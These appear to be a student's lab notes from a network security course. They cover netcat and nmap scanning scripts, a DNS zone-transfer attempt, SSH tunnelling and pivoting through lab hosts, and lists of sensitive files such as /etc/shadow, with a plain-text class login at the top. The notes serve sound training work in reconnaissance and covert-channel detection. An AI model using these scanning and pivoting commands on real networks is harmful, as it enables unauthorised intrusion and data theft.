User name: lavinia.bartoletti-kihn      Class ID: NET-MAIT-25-021
Password: lavinia.bartoletti-kihn!


Packet Headers 
          IPv4 packet header: 2.1.1.2
          IPv4 addresses : public, Private, Loopback, linklocal (APIPA), Multicast
          IPv4 offset Calc: Offset = (MTU - (IHLx4))/8          MTU(ipv4 header, TCP header, MSS,)46-1500 bytes    Example in 2.1.1.4 with vulnerability
          OS finger printing 2.1.1.5
          ICMPv4 protocol and headerr structure 2.1.1.7
          IPv6 packet header: 2.1.2.2

Network Reconnasance 
          > whois zonetransfer.me 
          > dig zonetransfer.meAAAA
          > dir axfr {@soa.server} {target-site}
          > dig axfr @nsztm1.digi.ninja zonetransfer.me
          
          p0f: Passive scanning of network traffic and packet captures.
          more /etc/p0f/p0f.fp
          sudo p0f -i eth0
          sudo p0f -r test.pcap
          
          for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done ### ping a range
          nmap 6.5.3.2
          
          ###NETCAT horizontal scanning
          TCP for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
          UDP for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'
          ###Netcat - Vertical Scanning
          TCP  nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
          UDP nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
          
          netcat tcp scan script                                                        netcat TCP scan script
                    #!/bin/bash
                    echo "Enter network address (e.g. 192.168.0): "                                      
                    read net
                    echo "Enter starting host range (e.g. 1): "
                    read start
                    echo "Enter ending host range (e.g. 254): "
                    read end
                    echo "Enter ports space-delimited (e.g. 21-23 80): "
                    read ports
                    for ((i=$start; i<=$end; i++))                                            for ((i=$start; i<=$end; i++))
                    do
                        nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open' &                      nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open' &
                    done
                    wait
          NETCAT banner grabbing
                  nc [Target IP] [Target Port]
                  nc 172.16.82.106 22
                  nc -u 172.16.82.106 53     (UDP)
                    (*There are nc scan scripts*)
          CURL and WGET                                                 Display ascii from destination
                  curl http://172.16.82.106
                  curl http://172.16.82.106 -o output.txt
                  curl ftp://172.16.82.106
                  curl ftp://172.16.82.106 -u student:password
                  curl ftp://172.16.82.106/file.txt -o output.txt
                  wget http://172.16.82.106                             downloads
                  wget -r http://172.16.82.106
                  wget -r ftp://172.16.82.106
                  wget -r ftp://172.16.82.106 --user=student --password=password
          sudo nmap -sN -T4 IP ###scan for hosts                                          (deep research for the options if needed)
          nmap -p- --open IP ### scan for ports
          echo "GET /" | nc 172.16.182.110 80 ###interfaces with a web sevice on host
          nmap -sT -p U:198-200 IP
          
          Traceroute firewalking if needed Tool: wget https://git.cybbh.space/cted/tech-college/cttsb/cctc/net/Net/-/raw/main/Resources/tr.py

          Content of interest:
                    /etc/passwd and /etc/shadow or SAM database
                    /usr/share/cctc
                    /etc/ssh/sshd_config
                    Configuration files
                    Log files
                    Backup files
                    Test pages
                    Client-side code

          Internal scans: 
                    Netstat
                    tasklists
                    ip route
                    find / -name flag* 2> /dev/null
          Active internal discovery:
                    Arp scan>nmap -sP -PR 172.16.82.96/27

file tranfser day 6

          Named Pipes
          mknod pipe p
          (listener to client)
          (sender) nc IP 1111 < .txt
          nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe (on relay)
          (receiver) nc -lvp 3333 
          
          scp syntax 
                    scp (-P 1111) student@172.16.82.106:secretstuff.txt /home/student ###download
                    scp secretstuff.txt student@172.16.82.106:/home/student ###upload
                    scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student ###copy a file from a remote host to another
                    We can SCP tru a Dynamic tunnel
                    
          How to make a pipe from a host sending to a port, and getting that pipe to us
          (middle)
          mknod mypipe
          nc -lvp 4321 < mypipe | nc -lvp 1111 > mypipe
          (host receiving)
          nc (middle IP & 1111) > .txt

          We can transfer files with base64
          ftp IP (then hit >passive)

TUNNELS
detecing covert channels with imcp: ICMP works with one request and one reply answer
Type 8 code 0 request
Type 0 code 0 answer
Check for:
Payload imbalance
Request/response imbalance
Large payloads in response

Detecting Covert Channels with DNS: DNS is a request/response protocol
1 request typically gets 1 response
Payloads generally do not exceed 512 bytes
Check for:
Request/response imbalances
Unusual payloads
Burstiness or continuous use

Detecting Covert Channels with HTTP: Request/Response protocol to pull web content
GET request may include .png, .exe, .(anything) files
Can vary in sizes of payloads
Typically "bursty" but not steady

SSH options -L  -D  -R  -NT
local port porward: 
ssh user@IP -L BindLocalPort:tgtIP:tgtPort -NT
ssh user@127.0.0.1 -p BindLocalPort

tunnel in a tunnel
ssh student@127.0.0.1 -p BindLocalPort -L 1112:tgtIP2:tgtPort2
ssh student@127.0.0.1 -p 1112
wget -r http://localhost:1112 (for a local tunnel)

To use TCP tools in a tunnel (use proxy chains)
ssh student@127.0.0.1 -p 1112 -D 9050 -NT
proxychains nmap 10.10.0.1/28(network in end of tunnel) -p 21-23,80
proxychains wget -r http://10.10.0.2 (thru tunnel to wget in a port 80, can use ftp)

Dynamic 1 step 
ssh student@172.16.1.15 -D 9050 2>/dev/null
Dynamic 2 step
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
ssh student@localhost -p 2222 -D 9050 2>/dev/null
proxychains wget -r http://nexjump

Remote Port Forwarding
IH>telnet BH1
BH1>ssh student@IHExternalP -R 21199:127.0.0.1:22 
IH>ssh student@127.0.0.1 -p 21999 (test)

Remote Port Forwarding even further into network
IH>telnet BH2
BH2>ssh student@BH1 -R 21199:127.0.0.1:22 -NT
IH> ssh student@BH2 -L 21101:LH:21199

Checking ports with proxyxhains
proxychains nc IP port
*************************************************************************************************************************
SSSSSSSSSSSSStep by step to tunnel Rick and Morty
          nmap -sT -T4 -Pn 10.50.176.142 -p 21-23,80 (1000-10,000)
          nc 10.50.176.142 23 (verify its telnet)
          wget -r http://10.50.176.142
          wget -r ftp://10.50.176.142
          oeg .png
          telnet 10.50.176.142
          RICK>netstat -antlp (to see whats open)
          ip a (to see network)
          arp
          ip route
          Rick>ssh student@MyFloatIP -R 1111:127.0.0.1:22 -NT (remote host)
          IH> ssh Rick@172.0.0.1 -p 1111 (to check tunnel)
          ssh Rick@127.0.0.1 -p 1111 -D 9050 -NT
          (new terminal)
          proxychains nmap -sT -T4 10.1.2.17/28 21-23,80
          proxychains wget
          proxychains nmap -sT -T4 10.1.2.18 
          nc ( to verify)
          ssh Rick@127.0.0.1 -p 1111 -L 1112:10.1.2.18:2222(the target port we found open on morty)
          ssh morty@127.0.0.1 -p 2222 (verify morty tunnel)
          ip a, 
          
          
          IH> ssh Morty@127.0.0.1 -p 2222 -L 3333:172.16.10.121:2323
          IH> ssh Jerry@127.0.0.1 -p 3333:192.168.10.69:22
          IH> 


           Content of interest:
                    /etc/passwd and /etc/shadow or SAM database
                    /usr/share/cctc
                    /etc/ssh/sshd_config | grep Port
                    Configuration files
                    Log files
                    Backup files
                    Test pages
                    Client-side code
                    use whereis or which for enumeration commands, may need to use full path for command

          Internal scans: 
                    Netstat -antlp or 
                    ss 
                    tasklists
                    ip route
                    ip a          
                    arp
                    systemctl status ssh
                    ip neighbor
                    nc IP port (to verify what a port is)

                    tcpdump -i eth1 -A -v "udp port 69" ( to sniff)            tcpdump -i eth0 -A -v port 23
                    sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 65 (change ttl)
                    
                    
                    find / -name flag* 2> /dev/null
          Active internal discovery:
                    Arp scan>nmap -sP -PR 172.16.82.96/27

**************************************************************************************************************************
ssh Aang@192.168.1.39
ssh Sokka@10.50.176.142 -L 21101:192.168.1.39:22 -NT
ssh Sokka@127.0.0.1 -p 21101
    1  whoami
    2  ip a
    3  netstat -antop 
    4  arp
    5  ip neighbor
    6  cd /usr/share/cctc
    7  ls

Network Analysis Day 7:
          Ephemeral Ports
                    IANA 49152–65535
                    Linux 32768–60999
                    Windows XP 1025–5000
                    Win 7/8/10 use IANA
                    Win Server 2008 1025–60000
                    Sun Solaris 32768–65535

          Some Indicators
                    .exe/executable files
                    NOP sled
                    Repeated Letters
                    Well Known Signatures
                    Mismatched Protocols
                    Unusual traffic
                    Large amounts of traffic/ unusual times
                    Source IP/Domains
                    Attempts to Disable or Evade Security Tools
                    Off-Hours
                    Network Scans
                    Non-standard Port Usage
                    Unusual Tasks or User Behaviors
                    Phishing or Obfuscated Email Attachments
                    Unauthorized Remote Logins
                    Destination IP/Domains
                    File Hashes of Malware
                    Modified Registry Keys
                    Excessive Email Use
                    Suspicious DNS Requests
                    Abnormal Use of Protocols
                    Unexpected Internal Network Scanning
                    Unexpected Outbound Traffic Volume
Network access controls
SNORT rules: indtalation directory /etc/snort, config file /etc/snort/snort.conf, Ruels direcroty /etc/snort/rules
